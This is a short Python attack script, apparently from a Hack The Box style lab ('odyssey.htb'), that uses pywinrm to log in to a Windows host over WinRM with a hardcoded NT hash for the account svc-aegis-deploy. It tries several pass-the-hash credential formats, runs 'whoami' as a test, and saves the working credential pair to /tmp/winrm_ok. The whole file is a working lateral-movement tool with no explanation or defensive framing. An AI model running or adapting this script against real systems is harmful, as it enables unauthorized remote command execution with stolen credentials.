#!/usr/bin/env python3
"""WinRM as svc-aegis-deploy via pywinrm PTH."""
import sys
sys.path.insert(0, "/tmp/pylibs")
import winrm

host = "172.16.0.10"
user = "odyssey\\svc-aegis-deploy"
# try several auth forms
nthash = "3a5026b2aa5ef2cbb7cb6a7be3a2bcfa"
candidates = [
    (user, nthash),
    (user, f"00000000000000000000000000000000:{nthash}"),
    (user, f"aad3b435b51404eeaad3b435b51404ee:{nthash}"),
    ("svc-aegis-deploy@odyssey.htb", nthash),
]

for u, p in candidates:
    print("try", u, p[:20], "...", flush=True)
    try:
        s = winrm.Session(
            f"http://{host}:5985/wsman",
            auth=(u, p),
            transport="ntlm",
            server_cert_validation="ignore",
        )
        r = s.run_cmd("whoami")
        print("STATUS", r.status_code)
        print("OUT", r.std_out.decode(errors="replace"))
        print("ERR", r.std_err.decode(errors="replace")[:300])
        if r.status_code == 0 and b"svc-aegis-deploy" in r.std_out:
            print("WINRM_OK", flush=True)
            open("/tmp/winrm_ok", "w").write(f"{u}|{p}")
            break
    except Exception as e:
        print("FAIL", type(e).__name__, e, flush=True)
